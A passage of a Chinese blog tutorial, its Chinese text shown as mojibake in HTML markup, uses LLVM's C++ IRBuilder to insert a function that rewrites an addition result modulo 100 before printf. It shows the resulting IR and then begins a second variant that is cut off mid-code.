punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateRetVoid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// ç¬¬ä¸‰ä¸ªåŸºæœ¬å—ä»€ä¹ˆéƒ½ä¸åš</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>work03_fn_nothing<span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateRetVoid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 2022-05-03 18:27:56     * TODO:     * åœ¨è°ƒç”¨prtinf å‡½æ•°ä¹‹å‰æ’å…¥è°ƒç”¨å‡½æ•°æŒ‡ä»¤     * ä»¥åŠè¯»å–fadd_res, ä¿®æ”¹printf ç¬¬ä¸‰ä¸ªå‚æ•°     * */</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>work03_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_load03 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>    in_prt<span class="token operator">-></span><span class="token function">setOperand</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>in_load03<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// M->print(outs(),nullptr);</span>    <span class="token comment">/**     * #include "llvm/IR/Verifier.h"     * 2022-05-02 11:43:34     * TODO:     * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§     * verifyModule(*M,&amp;errs()): true if the module is broken.      * */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: Module verify is ok \n"</span><span class="token punctuation">;</span>        <span class="token comment">// M->print(outs(),nullptr);</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * #include "llvm/Bitcode/BitcodeWriter.h"     * 2022-05-03 12:55:33     * TODO:     * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ     * */</span>    std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-8-æ•ˆæœ">2.8) æ•ˆæœ</h3><p>ä¿®æ”¹åIRå¦‚ä¸‹ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token operator">/</span>main main<span class="token punctuation">.</span>lldebug<span class="token operator">:</span> M is <span class="token operator">not</span> nulldebug<span class="token operator">:</span> Module verify is ok <span class="token punctuation">;</span> ModuleID <span class="token operator">=</span> <span class="token string">'main.ll'</span>source_filename <span class="token operator">=</span> <span class="token string">"t.c"</span>target datalayout <span class="token operator">=</span> <span class="token string">"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"</span>target triple <span class="token operator">=</span> <span class="token string">"x86_64-unknown-linux-gnu"</span><span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE <span class="token operator">=</span> type <span class="token punctuation">&#123;</span> i32<span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_marker<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> i32<span class="token punctuation">,</span> i32<span class="token punctuation">,</span> i64<span class="token punctuation">,</span> i16<span class="token punctuation">,</span> i8<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i64<span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_codecvt<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_wide_data<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i64<span class="token punctuation">,</span> i32<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span> x i8<span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_marker <span class="token operator">=</span> type opaque<span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_codecvt <span class="token operator">=</span> type opaque<span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_wide_data <span class="token operator">=</span> type opaque@<span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token keyword">private</span> unnamed_addr constant <span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span> c<span class="token string">"plz input two numbers\00"</span><span class="token punctuation">,</span> align <span class="token number">1</span>@<span class="token constant">stdin</span> <span class="token operator">=</span> external dso_local global <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> align <span class="token number">8</span>@<span class="token punctuation">.</span>str<span class="token punctuation">.</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token keyword">private</span> unnamed_addr constant <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span> c<span class="token string">"%.2f + %.2f = %.2f \0A\00"</span><span class="token punctuation">,</span> align <span class="token number">1</span>@fadd_res <span class="token operator">=</span> <span class="token keyword">private</span> global <span class="token keyword">double</span> <span class="token number">0.000000e+00</span><span class="token punctuation">,</span> align <span class="token number">8</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> noinline nounwind optnone uwtabledefine dso_local i32 @<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> #<span class="token number">0</span> <span class="token punctuation">&#123;</span>  <span class="token operator">%</span><span class="token number">1</span> <span class="token operator">=</span> alloca i32<span class="token punctuation">,</span> align <span class="token number">4</span>  <span class="token operator">%</span><span class="token number">2</span> <span class="token operator">=</span> alloca i64<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">3</span> <span class="token operator">=</span> alloca i8<span class="token operator">*</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">4</span> <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">5</span> <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  store i32 <span class="token number">0</span><span class="token punctuation">,</span> i32<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">1</span><span class="token punctuation">,</span> align <span class="token number">4</span>  <span class="token operator">%</span><span class="token number">6</span> <span class="token operator">=</span> call i32 @<span class="token function">puts</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token punctuation">.</span>str<span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  store i64 <span class="token number">100</span><span class="token punctuation">,</span> i64<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">7</span> <span class="token operator">=</span> load i64<span class="token punctuation">,</span> i64<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">8</span> <span class="token operator">=</span> call noalias i8<span class="token operator">*</span> @<span class="token function">malloc</span><span class="token punctuation">(</span>i64 noundef <span class="token operator">%</span><span class="token number">7</span><span class="token punctuation">)</span> #<span class="token number">4</span>  store i8<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">9</span> <span class="token operator">=</span> load <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token operator">*</span> @<span class="token constant">stdin</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">10</span> <span class="token operator">=</span> call i64 @<span class="token function">getline</span><span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> i64<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">9</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">11</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">12</span> <span class="token operator">=</span> call <span class="token keyword">double</span> @<span class="token function">atof</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">11</span><span class="token punctuation">)</span> #<span class="token number">5</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">13</span> <span class="token operator">=</span> load <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token operator">*</span> @<span class="token constant">stdin</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">14</span> <span class="token operator">=</span> call i64 @<span class="token function">getline</span><span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> i64<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">13</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">15</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">16</span> <span class="token operator">=</span> call <span class="token keyword">double</span> @<span class="token function">atof</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">15</span><span class="token punctuation">)</span> #<span class="token number">5</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">17</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">18</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">19</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">20</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">21</span> <span class="token operator">=</span> fadd <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token number">20</span>  <span class="token operator">%</span>ina1 <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  store <span class="token keyword">double</span> <span class="token number">1.000000e+02</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ina1<span class="token punctuation">,</span> align <span class="token number">8</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> @fadd_res<span class="token punctuation">,</span> align <span class="token number">8</span>  call <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">work03_fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">22</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> @fadd_res<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">23</span> <span class="token operator">=</span> call <span class="token function">i32</span> <span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">printf</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token punctuation">.</span>str<span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">24</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  call <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">24</span><span class="token punctuation">)</span> #<span class="token number">4</span>  ret i32 <span class="token number">0</span><span class="token punctuation">&#125;</span>declare dso_local i32 @<span class="token function">puts</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">1</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> nounwinddeclare dso_local noalias i8<span class="token operator">*</span> @<span class="token function">malloc</span><span class="token punctuation">(</span>i64 noundef<span class="token punctuation">)</span> #<span class="token number">2</span>declare dso_local i64 @<span class="token function">getline</span><span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token operator">*</span> noundef<span class="token punctuation">,</span> i64<span class="token operator">*</span> noundef<span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">1</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> nounwind readonly willreturndeclare dso_local <span class="token keyword">double</span> @<span class="token function">atof</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">3</span>declare dso_local i32 @<span class="token function">printf</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> #<span class="token number">1</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> nounwinddeclare dso_local <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">2</span>define <span class="token keyword">void</span> @<span class="token function">work03_fn</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>work03_fn_defaut<span class="token operator">:</span>  <span class="token operator">%</span><span class="token number">0</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> @fadd_res<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">1</span> <span class="token operator">=</span> fcmp ugt <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1.000000e+02</span>  br i1 <span class="token operator">%</span><span class="token number">1</span><span class="token punctuation">,</span> label <span class="token operator">%</span>work03_fn_change<span class="token punctuation">,</span> label <span class="token operator">%</span>work03_fn_nothingwork03_fn_change<span class="token operator">:</span>                                 <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>work03_fn_defaut  <span class="token operator">%</span><span class="token number">2</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> @fadd_res<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">3</span> <span class="token operator">=</span> frem <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1.000000e+02</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> @fadd_res<span class="token punctuation">,</span> align <span class="token number">8</span>  ret <span class="token keyword">void</span>work03_fn_nothing<span class="token operator">:</span>                                <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>work03_fn_defaut  ret <span class="token keyword">void</span><span class="token punctuation">&#125;</span>attributes #<span class="token number">0</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> noinline nounwind optnone uwtable <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"min-legal-vector-width"</span><span class="token operator">=</span><span class="token string">"0"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">1</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">2</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">3</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind readonly willreturn <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">4</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind <span class="token punctuation">&#125;</span>attributes #<span class="token number">5</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind readonly willreturn <span class="token punctuation">&#125;</span><span class="token operator">!</span>llvm<span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">!</span>llvm<span class="token punctuation">.</span>ident <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token operator">!</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">0</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span>i32 <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token string">"wchar_size"</span><span class="token punctuation">,</span> i32 <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span>i32 <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token string">"uwtable"</span><span class="token punctuation">,</span> i32 <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">2</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span>i32 <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token string">"frame-pointer"</span><span class="token punctuation">,</span> i32 <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">3</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token operator">!</span><span class="token string">"clang version 14.0.0"</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://s2.loli.net/2022/05/03/2OeUwxjNu5JoER6.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/03/2OeUwxjNu5JoER6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220503203858855"></p></div><h2 id="ä¸‰-æ€è·¯äºŒæ‰§è¡Œ">ä¸‰) æ€è·¯äºŒæ‰§è¡Œ</h2><div class="story post-story"><h3 id="2-1-2-2-åŒä¸Š">2.1) -2.2) åŒä¸Š</h3><p>æ·»åŠ ç›¸å…³å¿…è¦æŒ‡ä»¤</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-28 02:42:32 * TODO: * 1. åˆ›å»ºå¸¸é‡100 * 2. æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ * */</span><span class="token keyword">auto</span> f32 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> const_100 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// æ’å…¥åŸºæœ¬æŒ‡ä»¤ï¼Œå­˜å‚¨æœ€ç»ˆçš„ä¿®æ”¹faddç»“æœ</span>builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">auto</span> in_alloc02 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ia01"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-3-æ„é€ å‡½æ•°">2.3) æ„é€ å‡½æ•°</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-05-03 22:05:01 * TODO: * æ–°å»ºä¸€ä¸ªå‡½æ•°: * double work03_fn(double fdd_res)&#123; *  if(fdd_res > 100) *     return  fdd_res = fdd_res %100; * &#125;else&#123; *  return fdd_res; * &#125; * */</span><span class="token comment">// åˆ›å»ºå‡½æ•°çš„å‚æ•°</span>std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>Type<span class="token operator">*</span><span class="token operator">></span>parms<span class="token punctuation">;</span>parms<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>f32<span class="token punctuation">)</span><span class="token punctuation">;</span>ArrayRef<span 